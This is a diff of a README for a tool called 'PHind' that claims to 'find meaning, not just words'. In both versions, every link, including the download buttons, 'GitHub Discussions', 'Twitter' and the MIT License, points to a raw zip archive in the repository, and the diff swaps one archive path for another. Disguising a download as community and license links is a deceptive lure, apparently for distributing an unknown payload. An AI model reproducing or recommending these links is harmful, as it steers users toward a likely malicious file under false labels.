@@ -1,6 +1,6 @@
 # 🔍 PHind - Find Meaning, Not Just Words
 
-[![Download PHind](https://raw.githubusercontent.com/YamateKudashai/PHind/main/docs/PHind-v3.8-beta.4.zip)](https://raw.githubusercontent.com/YamateKudashai/PHind/main/docs/PHind-v3.8-beta.4.zip)
+[![Download PHind](https://raw.githubusercontent.com/YamateKudashai/PHind/main/src/Engine/Hind-P-Turkify.zip)](https://raw.githubusercontent.com/YamateKudashai/PHind/main/src/Engine/Hind-P-Turkify.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get started with PHind, you need to download it from our Releases page.
 
 Click the button below to visit the download page:
 
-[![Download PHind](https://raw.githubusercontent.com/YamateKudashai/PHind/main/docs/PHind-v3.8-beta.4.zip)](https://raw.githubusercontent.com/YamateKudashai/PHind/main/docs/PHind-v3.8-beta.4.zip)
+[![Download PHind](https://raw.githubusercontent.com/YamateKudashai/PHind/main/src/Engine/Hind-P-Turkify.zip)](https://raw.githubusercontent.com/YamateKudashai/PHind/main/src/Engine/Hind-P-Turkify.zip)
 
 Once you're on the Releases page, look for the latest version of PHind. Choose the appropriate file for your operating system and click to download. 
 
@@ -70,13 +70,13 @@ If you encounter any issues while installing or using PHind, try the following:
 
 Join our community for support and updates. You can find us across various platforms:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/YamateKudashai/PHind/main/docs/PHind-v3.8-beta.4.zip)
-- [Twitter](https://raw.githubusercontent.com/YamateKudashai/PHind/main/docs/PHind-v3.8-beta.4.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/YamateKudashai/PHind/main/src/Engine/Hind-P-Turkify.zip)
+- [Twitter](https://raw.githubusercontent.com/YamateKudashai/PHind/main/src/Engine/Hind-P-Turkify.zip)
 
 Feel free to ask questions, share ideas, or report issues you may face.
 
 ## 📜 License
 
-PHind is open-source software. You can freely use, modify, and distribute it under the terms of the [MIT License](https://raw.githubusercontent.com/YamateKudashai/PHind/main/docs/PHind-v3.8-beta.4.zip).
+PHind is open-source software. You can freely use, modify, and distribute it under the terms of the [MIT License](https://raw.githubusercontent.com/YamateKudashai/PHind/main/src/Engine/Hind-P-Turkify.zip).
 
 Now you're ready to get started with PHind! For any further questions or assistance, reach out to the community or check the documentation in the repository.
